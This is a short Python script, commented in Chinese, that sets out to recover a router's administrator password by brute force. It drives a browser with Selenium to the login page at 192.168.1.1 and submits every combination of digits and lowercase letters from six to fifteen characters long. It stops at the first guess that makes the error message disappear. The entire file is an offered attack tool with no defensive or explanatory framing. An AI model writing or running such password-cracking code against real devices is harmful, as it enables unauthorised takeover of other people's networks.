'''
Created on 2017年9月30日

@author: zheng

获取路由器的管理员密码
'''
import string
import itertools as its
from selenium.webdriver.common.keys import Keys
from Tools.SeleniumSpider import SeleniumSpider

class RouterManagePassSpider(SeleniumSpider):
    def __init__(self):
        SeleniumSpider.__init__(self, 'http://192.168.1.1/')
        
    def tryPass(self):
        driver = self.driver
        
        # 接下来就是暴力破解密码了
        words = "1234567890" + string.ascii_lowercase 
        # 密码长度为6-16位
        for n in range(6, 16):
            r = its.product(words, repeat=n)
            #
            for i in r:
                i = "".join(i)
                print(i)
                
                #这个得重新找，要不然会出错，我不知道为什么
                passwd = driver.find_element_by_id('pcPassword')
                submit = driver.find_element_by_id('loginBtn')
#                 # 先把上次的内容清理干净
#                 for t in range(1, 17):
#                     passwd.send_keys(Keys.BACK_SPACE)
                # 然后再输入
                passwd.send_keys(i)
                submit.click()
                
                #如果找不到提示密码错误的框，就说明已经登录成功了
                try:
                    driver.find_element_by_id('resetMsg')
                except:
                    return i
                
if __name__ == "__main__":
    t = RouterManagePassSpider()
    t.tryPass()
